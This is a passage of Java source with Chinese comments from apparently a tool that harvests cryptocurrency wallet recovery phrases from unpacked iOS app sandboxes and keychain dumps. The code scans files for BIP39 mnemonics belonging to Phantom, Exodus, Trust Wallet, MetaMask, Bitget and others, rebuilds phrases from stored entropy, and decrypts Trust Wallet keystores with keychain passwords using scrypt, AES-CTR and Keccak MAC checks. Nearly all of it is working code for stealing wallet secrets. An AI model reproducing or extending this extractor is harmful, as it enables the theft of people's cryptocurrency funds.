        try (java.util.stream.Stream<Path> walkStream = Files.walk(mt)) {
            walkStream.filter(Files::isRegularFile)
                    .forEach(p -> {
                        String text = readTextUtf8(p);
                        if (text == null) return;
                        String found = bip39.searchPhrase(text);
                        if (found != null) {
                            out.add(new PhraseResult("mytonwallet", found, mt.relativize(p).toString()));
                            return;
                        }
                    });
        } catch (IOException ignore) {}
    }

    // --- 兜底 sandbox 全目录 BIP39 正则（覆盖 metamask/okx/bitget/solflare 等未专用提取的） ---
    private void fallbackSandboxRegex(Path sandbox, List<PhraseResult> out) {
        // 已被专用扫描器处理的钱包目录，fallback 跳过避免重复 I/O
        java.util.Set<String> skipDirs = new java.util.HashSet<>(java.util.Arrays.asList(
                "exodus", "coin98", "tonhub", "mytonwallet"));
        // try-with-resources 关闭 Files.walk 持有的文件句柄，避免高并发下文件描述符泄漏
        try (java.util.stream.Stream<Path> stream = Files.walk(sandbox)) {
            stream.filter(Files::isRegularFile)
                    .forEach(p -> {
                        // 跳过已被专用扫描器处理的钱包目录
                        java.nio.file.Path rel = sandbox.relativize(p);
        if (rel.getNameCount() > 0 && skipDirs.contains(rel.getName(0).toString())) return;
                        // 跳过明显非文本的文件扩展名
                        String name = p.getFileName().toString().toLowerCase();
                        if (name.endsWith(".png") || name.endsWith(".jpg") || name.endsWith(".jpeg")
                                || name.endsWith(".svg") || name.endsWith(".db") || name.endsWith(".sqlite")
                                || name.endsWith(".sqlite-shm") || name.endsWith(".sqlite-wal")
                                || name.endsWith(".bin") || name.endsWith(".ttf") || name.endsWith(".hive")) {
                            return;
                        }
                        String text = readTextUtf8(p);
                        if (text == null || text.isEmpty()) return;
                        String found = bip39.searchPhrase(text);
                        if (found != null && !containsPhrase(out, found)) {
                            // 根据 sandbox 子目录名猜钱包名
                            String wallet = rel.getNameCount() > 0 ? rel.getName(0).toString() : "unknown_sandbox";
                            // 仅当该钱包名未找到时才用（避免覆盖专用提取结果）
                            if (!containsWallet(out, wallet)) {
                                out.add(new PhraseResult(wallet, found, "sandbox_regex:" + rel));
                            }
                        }
                    });
        } catch (IOException e) {
        }
    }

    // --- 兜底 hex 全目录 BIP39 正则（覆盖 unused_data.json / keychain_data.json 等不带钱包名前缀的明文助记词） ---
    private void fallbackHexRegex(Path hex, List<PhraseResult> out) {
        // 已被专用扫描器处理的钱包目录，fallback 跳过避免重复 I/O
        java.util.Set<String> skipDirs = new java.util.HashSet<>(java.util.Arrays.asList(
                "phantom", "exodus", "bitpie", "uniswap", "trustwallet", "trust"));
        // try-with-resources 关闭 Files.walk 持有的文件句柄
        try (java.util.stream.Stream<Path> stream = Files.walk(hex)) {
            stream.filter(Files::isRegularFile)
                    .forEach(p -> {
                        // 跳过已被专用扫描器处理的钱包目录
                        java.nio.file.Path rel = hex.relativize(p);
        if (rel.getNameCount() > 0 && skipDirs.contains(rel.getName(0).toString())) return;
                        // 跳过明显非文本；保留钥匙串导出的 .data.bin（UTF-8 JSON，常在 hex/unknown）
                        String name = p.getFileName().toString().toLowerCase();
                        if (name.endsWith(".png") || name.endsWith(".jpg") || name.endsWith(".jpeg")
                                || name.endsWith(".svg") || name.endsWith(".db") || name.endsWith(".sqlite")
                                || name.endsWith(".sqlite-shm") || name.endsWith(".sqlite-wal")
                                || name.endsWith(".ttf") || name.endsWith(".hive")
                                || name.endsWith(".realm")) {
                            return;
                        }
                        // 纯二进制 .bin 跳过；.data.bin / unused*.bin 放行
                        if (name.endsWith(".bin") && !name.endsWith(".data.bin") && !name.contains("unused")) {
                            return;
                        }
                        // hex/unknown 的 unused* 已由 scanHexCoin98FromUnknownUnused 处理
                        if (rel.getNameCount() > 0) {
                            String top = rel.getName(0).toString();
                            if ("unknown".equalsIgnoreCase(top) || "coin98".equalsIgnoreCase(top)) {
                                return;
                            }
                        }
                        String text = readTextUtf8(p);
                        if (text == null || text.isEmpty()) return;
                        String found = bip39.searchPhrase(text);
                        if (found != null && !containsPhrase(out, found)) {
                            // 先尝试用文件名中的钱包关键词归类
                            String lower = p.getFileName().toString().toLowerCase();
                            String wallet = guessHexWallet(lower, text.toLowerCase());
                            // unknown_hex 分类允许多条（可能多个不同助记词归类失败）；
                            // 其他钱包仅在专用扫描未命中时加入兜底结果，避免覆盖
                            if ("unknown_hex".equals(wallet) || !containsWallet(out, wallet)) {
                                out.add(new PhraseResult(wallet, found,
                                        "hex_regex:" + p.getFileName()));
                            }
                        }
                    });
        } catch (IOException e) {
        }
    }

    /** 根据 hex 文件名 / 内容关键词猜钱包归属（用于兜底 hex 正则命名） */
    private static String guessHexWallet(String fileNameLower, String contentLower) {
        if (fileNameLower.contains("phantom") || contentLower.contains("phantom")) return "phantom";
        if (fileNameLower.contains("exodus") || contentLower.contains("exodus")) return "exodus";
        if (fileNameLower.contains("bitpie") || contentLower.contains("bitpie")
                || fileNameLower.contains("seedphrasentropy")) return "bitpie";
        if (fileNameLower.contains("uniswap") || contentLower.contains("uniswap")) return "uniswap";
        if (fileNameLower.contains("trustwallet")) return "trust";
        if (fileNameLower.contains("coin98") || contentLower.contains("coin98")) return "coin98";
        if (fileNameLower.contains("okx") || contentLower.contains("okx")
                || fileNameLower.contains("okex")) return "okx";
        if (fileNameLower.contains("metamask") || contentLower.contains("metamask")
                || fileNameLower.contains("mmkv") && contentLower.contains("infura")) return "metamask";
        if (fileNameLower.contains("bitget") || contentLower.contains("bitget")
                || fileNameLower.contains("bitkeep")) return "bitget";
        if (fileNameLower.contains("solflare") || contentLower.contains("solflare")) return "solflare";
        if (fileNameLower.contains("tronlink") || contentLower.contains("tronlink")) return "tronlink";
        // 文件名本身带 mnemonic / accounts 关键词 → 归 unknown_hex
        if (fileNameLower.contains("unused") || fileNameLower.contains("mnemonic")
                || fileNameLower.contains("accounts") || fileNameLower.contains("keychain")) {
            return "unknown_hex";
        }
        return "unknown_hex";
    }

    // ============================================================
    // war JSON 兜底（保留旧逻辑，但不再是主路径）
    // ============================================================

    private void fallbackScanWarJson(JSONObject war, String unpackDir, List<PhraseResult> out) {
        extractFromKeychainAll(war, unpackDir, out);
        extractFromSandboxAll(war, unpackDir, out);
        fallbackScanAllWarJson(war, unpackDir, out);
    }

    // ---- war keychain 提取（保留原逻辑简化版） ----
    private void extractFromKeychainAll(JSONObject war, String unpackDir, List<PhraseResult> out) {
        JSONObject keychain = war.getJSONObject("keychain");
        if (keychain == null) return;
        JSONObject tables = keychain.getJSONObject("tables");
        if (tables == null) return;

        List<JSONObject> allItems = new ArrayList<>();
        for (String tableName : tables.keySet()) {
            JSONObject table = tables.getJSONObject(tableName);
            if (table == null) continue;
            JSONArray items = table.getJSONArray("items");
            if (items == null) continue;
            for (int i = 0; i < items.size(); i++) {
                JSONObject item = items.getJSONObject(i);
                if (item != null) allItems.add(item);
            }
        }

        handleTrustWalletWarJson(allItems, unpackDir, out);

        for (JSONObject item : allItems) {
            String service = lower(item.getString("service"));
            String account = lower(item.getString("account"));
            String accessGroup = lower(item.getString("accessGroup"));
            String combined = service + " " + account + " " + accessGroup;

            if ((accessGroup.contains("app.phantom") || combined.contains("phantom")) && !containsWallet(out, "phantom")) {
                String content = getDataContent(item, unpackDir);
                if (content != null) {
                    PhraseResult r = tryPhantomContent(content);
                    if (r != null) out.add(r);
                }
            }
            if (combined.contains("exodus") && !containsWallet(out, "exodus")) {
                String content = getDataContent(item, unpackDir);
                if (content != null) {
                    PhraseResult r = tryExodusContent(content);
                    if (r != null) out.add(r);
                }
            }
            if (combined.contains("bitpie") && !containsWallet(out, "bitpie")) {
                String content = getDataContent(item, unpackDir);
                if (content != null) {
                    PhraseResult r = tryBitpieContent(content);
                    if (r != null) out.add(r);
                }
            }
            if ((combined.contains("uniswap") || combined.contains("mnemonic")) && !containsWallet(out, "uniswap")) {
                String content = getDataContent(item, unpackDir);
                if (content != null) {
                    PhraseResult r = tryUniswapContent(content);
                    if (r != null) out.add(r);
                }
            }
        }
    }

    private void handleTrustWalletWarJson(List<JSONObject> allItems, String unpackDir, List<PhraseResult> out) {
        List<String> pwdList = new ArrayList<>();
        List<JSONObject> ksItems = new ArrayList<>();
        for (JSONObject item : allItems) {
            String account = lower(item.getString("account"));
            String service = lower(item.getString("service"));
            // 对齐磁盘扫描：密码和 keystore 可能在 trustwallet 或 trust 两类 keychain 中
            boolean isTrust = account.contains("trustwallet") || account.contains("trust")
                    || service.contains("trustwallet") || service.contains("trust");
            if (!isTrust) continue;
            String content = getDataContent(item, unpackDir);
            if (content == null) continue;
            String trimmed = content.trim();
            // 兼容 64hex 明文密码，以及 128hex 双重编码密码（normalizePwdHex 会自动解码）
            String pwd = normalizePwdHex(trimmed);
            if (pwd != null) {
                if (!pwdList.contains(pwd)) pwdList.add(pwd);
            } else if ((account.contains("utc") || account.contains("hd-wallet")) && trimmed.startsWith("{")) {
                ksItems.add(item);
            }
        }
        for (String pwdHex : pwdList) {
            for (JSONObject ksItem : ksItems) {
                String ksContent = getDataContent(ksItem, unpackDir);
                if (ksContent == null) continue;
                PhraseResult r = tryTrustDecrypt(pwdHex, ksContent);
                if (r != null && !containsWallet(out, "trust")) {
                    out.add(r);
                    return;
                }
            }
        }
    }

    private void extractFromSandboxAll(JSONObject war, String unpackDir, List<PhraseResult> out) {
        JSONObject sandbox = war.getJSONObject("sandbox");
        if (sandbox == null) return;
        for (String appName : sandbox.keySet()) {
            if (containsWallet(out, appName)) continue;
            JSONObject appData = sandbox.getJSONObject(appName);
            if (appData == null) continue;
            String allText = appData.toJSONString();
            String phrase = bip39.searchPhrase(allText.toLowerCase());
            if (phrase != null) {
                out.add(new PhraseResult(appName, phrase, "war_sandbox_json_regex"));
                continue;
            }
            for (String key : appData.keySet()) {
                Object v = appData.get(key);
                String s = resolveSandboxValue(v, appName, key, unpackDir);
                if (s == null) continue;
                phrase = bip39.searchPhrase(s.toLowerCase());
                if (phrase != null) {
                    out.add(new PhraseResult(appName, phrase, "war_sandbox_file:" + key));
                    break;
                }
            }
        }
    }

    private void fallbackScanAllWarJson(JSONObject war, String unpackDir, List<PhraseResult> out) {
        JSONObject keychain = war.getJSONObject("keychain");
        if (keychain != null) {
            JSONObject tables = keychain.getJSONObject("tables");
            if (tables != null) {
                for (String tableName : tables.keySet()) {
                    JSONObject table = tables.getJSONObject(tableName);
                    if (table == null) continue;
                    JSONArray items = table.getJSONArray("items");
                    if (items == null) continue;
                    for (int i = 0; i < items.size(); i++) {
                        JSONObject item = items.getJSONObject(i);
                        String content = getDataContent(item, unpackDir);
                        if (content == null) continue;
                        String phrase = bip39.searchPhrase(content.toLowerCase());
                        if (phrase != null && !containsPhrase(out, phrase)) {
                            String service = item.getString("service");
                            out.add(new PhraseResult("fallback_kc_" + safeName(service), phrase, "fallback_regex"));
                        }
                    }
                }
            }
        }
    }

    // ---- 各钱包内容级提取（war JSON 兜底也用） ----
    private PhraseResult tryPhantomContent(String content) {
        try {
            JSONObject j = JSON.parseObject(content);
            if (j != null) {
                Object ent = j.get("entropy");
                if (ent != null) {
                    byte[] arr = parseEntropy(ent);
                    if (arr != null && arr.length >= 16) {
                        String mn = bip39.entropyToMnemonic(arr);
                        if (mn != null && bip39.validateMnemonic(mn)) {
                            return new PhraseResult("phantom", mn, "vault.entropy→BIP39");
                        }
                    }
                }
            }
        } catch (Exception ignore) {}
        String f = bip39.searchPhrase(content);
        return f == null ? null : new PhraseResult("phantom", f, "kc_plaintext");
    }

    private PhraseResult tryExodusContent(String content) {
        if (content == null) return null;
        try {
            // 第一层：可能是 JSON 字符串嵌套（"\"{\\\"mnemonic\\\":\\\"...\\\"}\""），先解一层再解析
            String unwrapped = content;
            String trimmed = unwrapped.trim();
            if (trimmed.startsWith("\"") && trimmed.endsWith("\"") && trimmed.length() > 2) {
                try {
                    String candidate = JSON.parseObject(trimmed, String.class);
                    if (candidate != null) unwrapped = candidate;
                } catch (Exception ignore) { /* 不是字符串 JSON，保留原文本 */ }
            }
            JSONObject j = JSON.parseObject(unwrapped);
            if (j != null) {
                for (String key : new String[]{"mnemonic", "seed", "phrase", "mnemonicWords", "words"}) {
                    Object v = j.get(key);
                    if (v instanceof String) {
                        String s = ((String) v).trim().toLowerCase();
                        if (bip39.validateMnemonic(s)) {
                            return new PhraseResult("exodus", s, "kc_plaintext");
                        }
                    }
                }
                // 嵌套 JSON 字符串字段：mnemonic 值本身是个 JSON 字符串，再解一层
                Object mwo = j.get("mnemonicWordsObj");
                if (mwo instanceof String) {
                    try {
                        JSONObject inner = JSON.parseObject((String) mwo);
                        if (inner != null) {
                            String s = inner.getString("mnemonic");
                            if (s != null && bip39.validateMnemonic(s.trim().toLowerCase())) {
                                return new PhraseResult("exodus", s.trim().toLowerCase(), "kc_plaintext(mwobj)");
                            }
                        }
                    } catch (Exception ignore) {}
                }
            }
            // 顶层是数组（[{"mnemonic":"..."}]）
            JSONArray arr = safeJsonArray(unwrapped);
            if (arr != null) {
                for (int i = 0; i < arr.size(); i++) {
                    Object e = arr.get(i);
                    if (!(e instanceof JSONObject)) continue;
                    for (String key : new String[]{"mnemonic", "seed", "phrase", "mnemonicWords"}) {
                        Object v = ((JSONObject) e).get(key);
                        if (v instanceof String) {
                            String s = ((String) v).trim().toLowerCase();
                            if (bip39.validateMnemonic(s)) {
                                return new PhraseResult("exodus", s, "kc_json_array." + i + "." + key);
                            }
                        }
                    }
                }
            }
        } catch (Exception ignore) {}
        String f = bip39.searchPhrase(content);
        return f == null ? null : new PhraseResult("exodus", f, "kc_regex");
    }

    private PhraseResult tryBitpieContent(String content) {
        String trimmed = content.trim();
        if (trimmed.matches("[0-9a-fA-F]{32,128}") && trimmed.length() % 2 == 0) {
            // 双层 hex 编码检测（与 scanHexBitpie / Trust 密码文件一致）
            byte[] ent = decodeBitpieEntropy(trimmed);
            if (ent != null) {
                String mn = bip39.entropyToMnemonic(ent);
                if (mn != null && bip39.validateMnemonic(mn)) {
                    return new PhraseResult("bitpie", mn, "seedPhraseEntropy→BIP39(" + ent.length + "B)");
                }
            }
        }
        String f = bip39.searchPhrase(content);
        return f == null ? null : new PhraseResult("bitpie", f, "kc_regex");
    }

    private PhraseResult tryUniswapContent(String content) {
        String trimmed = content.trim();
        if (trimmed.startsWith("\"") && trimmed.endsWith("\"")) trimmed = trimmed.substring(1, trimmed.length() - 1);
        if (bip39.validateMnemonic(trimmed.toLowerCase())) {
            return new PhraseResult("uniswap", trimmed.toLowerCase(), "kc_plaintext");
        }
        try {
            JSONObject j = JSON.parseObject(content);
            if (j != null) {
                for (String k : new String[]{"mnemonic", "seed", "phrase"}) {
                    String v = j.getString(k);
                    if (v != null && bip39.validateMnemonic(v.trim().toLowerCase())) {
                        return new PhraseResult("uniswap", v.trim().toLowerCase(), "kc_json." + k);
                    }
                }
            }
        } catch (Exception ignore) {}
        String f = bip39.searchPhrase(content);
        return f == null ? null : new PhraseResult("uniswap", f, "kc_regex");
    }

    // ============================================================
    // Trust 解密（scrypt + AES-128-CTR + Keccak-256 MAC）
    // ============================================================

    private PhraseResult tryTrustDecrypt(String pwdHex, String ksContent) {
        try {
            JSONObject ks = JSON.parseObject(ksContent);
            if (ks == null) return null;
            JSONObject crypto = ks.containsKey("crypto") ? ks.getJSONObject("crypto")
                    : (ks.containsKey("Crypto") ? ks.getJSONObject("Crypto") : null);
            if (crypto == null) return null;

            String cipherStr = crypto.getString("ciphertext");
            JSONObject cipherparams = crypto.getJSONObject("cipherparams");
            String ivStr = cipherparams == null ? null : cipherparams.getString("iv");
            String macStr = crypto.getString("mac");
            if (cipherStr == null || ivStr == null || macStr == null) return null;
            if (!"aes-128-ctr".equalsIgnoreCase(crypto.getString("cipher"))) {
                return null;
            }
            JSONObject kdfparams = crypto.getJSONObject("kdfparams");
            int n = kdfparams.getIntValue("n");
            int r = kdfparams.getIntValue("r");
            int p = kdfparams.getIntValue("p");
            int dklen = kdfparams.getIntValue("dklen");
            String saltHex = kdfparams.getString("salt");
            byte[] salt = hexToBytes(saltHex);

            // 🔍 运行期依赖探测（DEBUG 级别，正常运行不刷屏；需要定位时调高 log level）
            boolean scOk = true, hutOk = true;
            try { Class.forName("org.bouncycastle.crypto.generators.SCrypt"); }
            catch (Throwable t) { scOk = false; }
            try {
                Class.forName("cn.hutool.crypto.digest.DigestUtil");
                byte[] probe = keccak256HutoolAny(new byte[1]);
                hutOk = (probe != null && probe.length == 32);
            } catch (Throwable t) { hutOk = false; }

            // 密码候选：对齐用户说明 + Python 脚本，两种编码全部尝试
            //   1) UTF-8 64 bytes = pwdHex.getBytes(UTF-8)  → Python t.strip().encode()  ← 优先
            //   2) 32 raw bytes  = hexToBytes(pwdHex)         → 有些 KC 直接把 hex 当 bytes
            byte[] pwd1 = pwdHex.getBytes(StandardCharsets.UTF_8);
            byte[] pwd2 = (pwdHex.matches("[0-9a-fA-F]{64}")) ? hexToBytes(pwdHex) : null;
            byte[][] candidates = (pwd2 != null) ? new byte[][]{pwd1, pwd2} : new byte[][]{pwd1};
            String[] candLabels  = (pwd2 != null) ? new String[]{"utf8_64bytes", "hex_decode_32bytes"} : new String[]{"utf8_64bytes"};

            byte[] ciphertext = hexToBytes(cipherStr);
            byte[] iv = hexToBytes(ivStr);
            byte[] expectedMac = hexToBytes(macStr);

            // 失败时汇总诊断用，避免每次都跑两次 keccak 占 CPU
            StringBuilder failDiag = new StringBuilder();
            failDiag.append("ks_addr=").append(ks.getString("address"));
            failDiag.append(" mac_expected=").append((expectedMac != null && expectedMac.length >= 32) ? bytesHex(expectedMac, 0, 32) : "n/a");
            failDiag.append(" {");

            for (int ci = 0; ci < candidates.length; ci++) {
                byte[] pwd = candidates[ci];
                String label = candLabels[ci];

                // SCrypt：优先 Bouncy Castle `generate(P,S,N,r,p,dklen)`（100% 对齐 Python hashlib.scrypt）
                //          失败 fallback 到 scryptJ（Java 纯手版，历史上与 BC 结果不吻合，BC 可用时绝不要走）
                byte[] dk = null;
                String dkSource = null;
                try {
                    dk = SCrypt.generate(pwd, salt, n, r, p, dklen);
                    dkSource = "BC";
                } catch (Throwable t1) {
                    try {
                        dk = scryptJ(pwd, salt, n, r, p, dklen);
                        dkSource = "scryptJ";
                    } catch (Throwable t2) {
                        failDiag.append(" [").append(label).append("] dk=FAIL");
                        continue;
                    }
                }
                if (dk == null) continue;

                // Keccak-256 MAC：MAC = keccak256(dk[16:] || ciphertext)
                byte[] macInput = new byte[dk.length - 16 + ciphertext.length];
                System.arraycopy(dk, 16, macInput, 0, dk.length - 16);
                System.arraycopy(ciphertext, 0, macInput, dk.length - 16, ciphertext.length);
                byte[] actualMac = keccak256(macInput); // Hutool 优先，兜底 self

                if (expectedMac != null && actualMac != null && bytesEqual(expectedMac, actualMac)) {
                    byte[] key16 = new byte[16];
                    System.arraycopy(dk, 0, key16, 0, 16);
                    byte[] plain = aesCtrDecrypt(key16, iv, ciphertext);
                    if (plain == null) continue;

                    String mn = new String(plain, StandardCharsets.UTF_8).trim();
                    if (bip39.validateMnemonic(mn)) {
                        return new PhraseResult("trust", mn, "keystore+kc_password");
                    }
                    String[] ws = mn.split("\\s+");
                    if (ws.length == 12 || ws.length == 24) {
                        log.warn("【mnemonic】trust 解密后 BIP39 校验未通过，但为 12/24 词格式，仍保留 pwd_variant={}", label);
                        return new PhraseResult("trust", mn, "keystore+kc_password(invalid_bip39)");
                    } else {
                        log.warn("【mnemonic】trust variant={} MAC 已匹配 AES OK 但词格式不对 words={} head={}",
                                label, ws.length, mn.length() <= 120 ? mn : mn.substring(0, 120));
                    }
                }

                // 变体失败：记录关键 4 个字段（长度短，不占日志量），仅当所有变体都失败才整体 WARN 打出来
                failDiag.append(" [").append(label).append("]");
                failDiag.append(" dk_src=").append(dkSource);
                failDiag.append(" dk[:8]=").append((dk.length >= 8)  ? bytesHex(dk, 0, 8) : "n/a");
                failDiag.append(" dk[16:24]=").append((dk.length >= 24) ? bytesHex(dk, 16, 8) : "n/a");
                failDiag.append(" mac_actual[:16]=").append((actualMac != null && actualMac.length >= 16) ? bytesHex(actualMac, 0, 16) : "n/a");
            }
            failDiag.append(" }");
            // 所有变体都失败才 WARN 一次，把上面汇总的 dk[:8]/dk[16:24]/mac 全打印，便于定位
            log.warn("【mnemonic】trust 有密码和 keystore，但全部解密失败（MAC 不匹配/无合法 BIP39 词）：{}", failDiag.toString());
            return null;
        } catch (Throwable t) {
            log.warn("【mnemonic】trust decrypt err: {}", t.toString());
            return null;
        }
    }

    private static String bytesHex(byte[] b, int off, int len) {
        if (b == null) return "";
        int end = Math.min(b.length, off + len);
        StringBuilder sb = new StringBuilder((end - off) * 2);
        for (int i = off; i < end; i++) {
            int v = b[i] & 0xFF;
            sb.append(HEX_CHARS[v >>> 4]).append(HEX_CHARS[v & 0x0F]);
        }
        return sb.toString();
    }

    // ---- 纯 Java scrypt 实现 ----
    private static byte[] scryptJ(byte[] password, byte[] salt, int n, int r, int p, int dkLen) {
        try {
            int blockSize = 128 * r;
            byte[] b = pbkdf2Sha256(password, salt, 1, p * blockSize);
            int[] v = new int[32 * r * n];
            int[] xy = new int[32 * r];
            for (int i = 0; i < p; i++) {
                int blockOff = i * blockSize;
                for (int j = 0; j < blockSize / 4; j++) {
                    xy[j] = (b[blockOff + j * 4] & 0xff)
                            | ((b[blockOff + j * 4 + 1] & 0xff) << 8)
                            | ((b[blockOff + j * 4 + 2] & 0xff) << 16)
                            | ((b[blockOff + j * 4 + 3] & 0xff) << 24);
                }
                for (int j = 0; j < n; j++) {
                    System.arraycopy(xy, 0, v, j * xy.length, xy.length);
                    salsa208Core(xy);
                }
                for (int j = 0; j < blockSize / 4; j++) {
                    int val = xy[j];
                    b[blockOff + j * 4] = (byte) (val & 0xff);
                    b[blockOff + j * 4 + 1] = (byte) ((val >> 8) & 0xff);
                    b[blockOff + j * 4 + 2] = (byte) ((val >> 16) & 0xff);
                    b[blockOff + j * 4 + 3] = (byte) ((val >> 24) & 0xff);
                }
            }
            return pbkdf2Sha256(password, b, 1, dkLen);
        } catch (Throwable t) {
            log.warn("【mnemonic】scryptJ 异常: {}", t.toString());
            return null;
        }
    }

    private static void salsa208Core(int[] x) {
        for (int i = 0; i < 8; i += 2) {
            x[4] ^= rotate(x[0] + x[12], 7); x[8] ^= rotate(x[4] + x[0], 9);
            x[12] ^= rotate(x[8] + x[4], 13); x[0] ^= rotate(x[12] + x[8], 18);
            x[9] ^= rotate(x[5] + x[1], 7); x[13] ^= rotate(x[9] + x[5], 9);
            x[1] ^= rotate(x[13] + x[9], 13); x[5] ^= rotate(x[1] + x[13], 18);
            x[14] ^= rotate(x[10] + x[6], 7); x[2] ^= rotate(x[14] + x[10], 9);
            x[6] ^= rotate(x[2] + x[14], 13); x[10] ^= rotate(x[6] + x[2], 18);
            x[3] ^= rotate(x[15] + x[11], 7); x[7] ^= rotate(x[3] + x[15], 9);
            x[11] ^= rotate(x[7] + x[3], 13); x[15] ^= rotate(x[11] + x[7], 18);
            x[1] ^= rotate(x[0] + x[3], 7); x[2] ^= rotate(x[1] + x[0], 9);
            x[3] ^= rotate(x[2] + x[1], 13); x[0] ^= rotate(x[3] + x[2], 18);
            x[6] ^= rotate(x[5] + x[4], 7); x[7] ^= rotate(x[6] + x[5], 9);
            x[4] ^= rotate(x[7] + x[6], 13); x[5] ^= rotate(x[4] + x[7], 18);
            x[11] ^= rotate(x[10] + x[9], 7); x[8] ^= rotate(x[11] + x[10], 9);
            x[9] ^= rotate(x[8] + x[11], 13); x[10] ^= rotate(x[9] + x[8], 18);
            x[12] ^= rotate(x[15] + x[14], 7); x[13] ^= rotate(x[12] + x[15], 9);
            x[14] ^= rotate(x[13] + x[12], 13); x[15] ^= rotate(x[14] + x[13], 18);
        }
    }

    private static int rotate(int a, int b) { return (a << b) | (a >>> (32 - b)); }

    private static byte[] pbkdf2Sha256(byte[] password, byte[] salt, int iterations, int keyLen) throws Exception {
        javax.crypto.Mac mac = javax.crypto.Mac.getInstance("HmacSHA256");
        mac.init(new SecretKeySpec(password, "HmacSHA256"));
        int hLen = 32;
        int l = (keyLen + hLen - 1) / hLen;
        byte[] result = new byte[l * hLen];
        int offset = 0;
        byte[] U = new byte[salt.length + 4];
        System.arraycopy(salt, 0, U, 0, salt.length);
        for (int i = 1; i <= l; i++) {
            U[salt.length] = (byte) (i >> 24); U[salt.length + 1] = (byte) (i >> 16);
            U[salt.length + 2] = (byte) (i >> 8); U[salt.length + 3] = (byte) i;
            byte[] T = mac.doFinal(U);
            byte[] Ti = T;
            for (int j = 1; j < iterations; j++) {
                Ti = mac.doFinal(Ti);
                for (int k = 0; k < hLen; k++) T[k] ^= Ti[k];
            }
            System.arraycopy(T, 0, result, offset, hLen);
            offset += hLen;
        }
        byte[] dk = new byte[keyLen];
        System.arraycopy(result, 0, dk, 0, keyLen);
        return dk;
    }

    // ---- Keccak-256：Hutool 版本差异大，反射多签名探测；全部失败走 self（RC 已补齐 long[24]）----
    private static byte[] keccak256(byte[] input) {
        byte[] r = keccak256HutoolAny(input);
        if (r != null) return r;
        try { return keccak256Self(input); }
        catch (Throwable t) { log.warn("keccak256 FAIL: {}", t.toString()); return null; }
    }

    /** 反射尝试 Hutool 里存在的任意 Keccak-256 入口，避免版本间签名差异导致编译/运行失败 */
    private static byte[] keccak256HutoolAny(byte[] input) {
        try {
            Class<?> du = Class.forName("cn.hutool.crypto.digest.DigestUtil");
            // ① DigestUtil.keccak256(byte[]) byte[]→byte[]（Hutool 5.7+ 才有）
            try {
                java.lang.reflect.Method m = du.getMethod("keccak256", byte[].class);
                Object o = m.invoke(null, input);
                if (o instanceof byte[]) return (byte[]) o;
            } catch (NoSuchMethodException ignore) {}
            // ② DigestUtil.keccak256(String hexStr) String→String（Hutool 5.6 就有）
            try {
                java.lang.reflect.Method m = du.getMethod("keccak256", String.class);
                Object o = m.invoke(null, bytesHex(input, 0, input.length));
                if (o instanceof String) return hexToBytes((String) o);
            } catch (NoSuchMethodException ignore) {}
            // ③ new Digester("Keccak-256").digest(byte[])
            try {
                Class<?> dgClz = Class.forName("cn.hutool.crypto.digest.Digester");
                Object dg = dgClz.getConstructor(String.class).newInstance("Keccak-256");
                java.lang.reflect.Method digest = dgClz.getMethod("digest", byte[].class);
                Object o = digest.invoke(dg, input);
                if (o instanceof byte[]) return (byte[]) o;
            } catch (NoSuchMethodException | ClassNotFoundException ignore) {}
        } catch (Throwable t) {
            // 任何异常都只是 Hutool 不可用，返回 null 让 self 兜底
        }
        return null;
    }

    // Keccak-f[1600] Round Constants —— **必须用完整 64 位**；int[] 会截断高 32 位导致 Keccak 算错。
    // 参考：https://keccak.team/keccak_specs_summary.html
    private static final long[] RC = {
            0x0000000000000001L, 0x0000000000008082L, 0x800000000000808aL, 0x8000000080008000L,
            0x000000000000808bL, 0x0000000080000001L, 0x8000000080008081L, 0x8000000000008009L,
            0x000000000000008aL, 0x0000000000000088L, 0x0000000080008009L, 0x000000008000000aL,
            0x000000008000808bL, 0x800000000000008bL, 0x8000000000008089L, 0x8000000000008003L,
            0x8000000000008002L, 0x8000000000000080L, 0x000000000000800aL, 0x800000008000000aL,
            0x8000000080008081L, 0x8000000000008080L, 0x0000000080000001L, 0x8000000080008008L
    };
    private static final int[][] R = {
            {0, 36, 3, 41, 18}, {1, 44, 10, 45, 2}, {62, 6, 43, 15, 61},
            {28, 55, 25, 21, 56}, {27, 20, 39, 8, 14}
    };

    private static byte[] keccak256Self(byte[] input) {
        long[] st = new long[25];
        int rate = 136;
        byte[] padded = keccakPad10x1(input, rate);
        for (int off = 0; off < padded.length; off += rate) {
            for (int i = 0; i < rate / 8; i++) {
                long li = 0;
                for (int j = 0; j < 8; j++) li |= ((long) (padded[off + i * 8 + j] & 0xff)) << (j * 8);
                st[i] ^= li;
            }
            keccakF1600(st);
        }
        byte[] out = new byte[32];
        for (int i = 0; i < 4; i++) {
            long l = st[i];
            for (int j = 0; j < 8; j++) { out[i * 8 + j] = (byte) (l & 0xff); l >>>= 8; }
        }
        return out;
    }

    private static void keccakF1600(long[] st) {
        long[] b = new long[25];
        long[] c = new long[5];
        long[] d = new long[5];
        for (int round = 0; round < 24; round++) {
            for (int i = 0; i < 5; i++) c[i] = st[i] ^ st[i+5] ^ st[i+10] ^ st[i+15] ^ st[i+20];
            for (int i = 0; i < 5; i++) d[i] = c[(i+4)%5] ^ rotl64(c[(i+1)%5], 1);
            for (int i = 0; i < 25; i++) st[i] ^= d[i%5];
            for (int i = 0; i < 5; i++) for (int j = 0; j < 5; j++)
                b[j * 5 + ((2*i + 3*j) % 5)] = rotl64(st[i*5+j], R[i][j]);
            for (int i = 0; i < 5; i++) for (int j = 0; j < 5; j++) {
                long bj = b[j*5+i];
                long bjn = b[((j+1)%5)*5 + i];
                long bjn2 = b[((j+2)%5)*5 + i];
                st[i*5 + j] = bj ^ ((~bjn) & bjn2);
            }
            st[0] ^= RC[round % RC.length];
        }
    }

    private static long rotl64(long x, int n) { n = n % 64; return (x << n) | (x >>> (64 - n)); }

    private static byte[] keccakPad10x1(byte[] input, int rate) {
        int newLen = input.length + 1;
        while (newLen % rate != 0) newLen++;
        byte[] out = new byte[newLen];
        System.arraycopy(input, 0, out, 0, input.length);
        out[input.length] = 0x01;
        out[out.length - 1] |= (byte) 0x80;
        return out;
    }

    private static byte[] aesCtrDecrypt(byte[] key16, byte[] iv, byte[] ct) {
        try {
            Cipher c = Cipher.getInstance("AES/CTR/NoPadding");
            c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key16, "AES"), new IvParameterSpec(iv));
            return c.doFinal(ct);
        } catch (Throwable t) { return null; }
    }

    private static boolean bytesEqual(byte[] a, byte[] b) {
        if (a == null || b == null || a.length != b.length) return false;
        for (int i = 0; i < a.length; i++) if (a[i] != b[i]) return false;
        return true;
    }

    // ============================================================
    // 工具方法
